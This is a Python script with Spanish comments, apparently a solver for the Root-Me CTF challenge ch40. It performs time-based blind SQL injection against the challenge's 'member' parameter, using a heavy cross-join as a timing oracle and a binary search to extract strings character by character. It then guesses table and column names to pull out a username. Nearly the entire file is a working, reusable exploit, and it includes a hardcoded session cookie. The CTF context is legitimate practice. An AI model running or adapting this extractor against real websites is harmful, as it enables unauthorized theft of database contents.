#!/usr/bin/env python3
"""
SQL INJECTION TIME-BASED - ROOT-ME CH40
VERSIÓN 37 - EXTRAER UN VALOR CONOCIDO
"""
import requests
import time
import statistics

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class TimeBasedSQLInjector:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        self.baseline = 29.48
        self.threshold = 31.48
        self.heavy = "(SELECT COUNT(*) FROM usuarios, usuarios T1, usuarios T2)"
        self.technique = "1 OR ({cond}) OR {heavy}"
        
    def test_payload(self, payload, repeats=5):
        tiempos = []
        params = {"action": "member", "member": payload}
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.get(URL, params=params, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.1)
        return statistics.median(tiempos) if tiempos else 0
    
    def is_true(self, condition):
        payload = self.technique.format(cond=condition, heavy=self.heavy)
        t = self.test_payload(payload, repeats=3)
        return t < self.threshold
    
    def extract_char_at_position(self, query, pos):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            cond = f"ASCII(SUBSTRING(({query}), {pos}, 1)) > {mid}"
            if self.is_true(cond):
                low = mid + 1
            else:
                high = mid - 1
        return chr(low)
    
    def extract_string(self, query, label="Extrayendo", max_len=20):
        print(f"\n[*] {label}...")
        print(f"    Query: {query}")
        result = ""
        for pos in range(1, max_len + 1):
            char = self.extract_char_at_position(query, pos)
            result += char
            print(f"    [{pos}] '{char}' (ASCII: {ord(char)})")
            if ord(char) == 0 or ord(char) == 32:
                break
            time.sleep(0.1)
        return result

# ============================================================
# EJECUCIÓN
# ============================================================
injector = TimeBasedSQLInjector()

print("="*70)
print("  EXTRAYENDO UN VALOR CONOCIDO")
print("="*70)

# 1. Probar extraer 'admin' de un SELECT simple
print("\n[1] Probando extracción de 'admin' con SELECT 'admin'")
result = injector.extract_string("SELECT 'admin'", "SELECT 'admin'")
print(f"\n  Resultado: '{result}'")
print(f"  Esperado: 'admin'")
if result == "admin":
    print("  ✅ ¡ÉXITO! La extracción funciona correctamente")
else:
    print("  ❌ La extracción NO funciona correctamente")

# 2. Si funciona, extraer el usuario de la tabla
if result == "admin":
    print("\n[2] Extrayendo usuario de la tabla...")
    
    # Probar diferentes tablas y columnas
    tablas = ['users', 'usuarios', 'member', 'members']
    columnas = ['username', 'user', 'login', 'name']
    
    for tabla in tablas:
        for col in columnas:
            query = f"SELECT {col} FROM {tabla} WHERE id=1"
            print(f"\n  Probando: {tabla}.{col}")
            usuario = injector.extract_string(query, f"{tabla}.{col}")
            print(f"    Resultado: '{usuario}'")
            if usuario == "admin":
                print(f"    ✅ ¡ENCONTRADO! Tabla: {tabla}, Columna: {col}")
                break
        if usuario == "admin":
            break
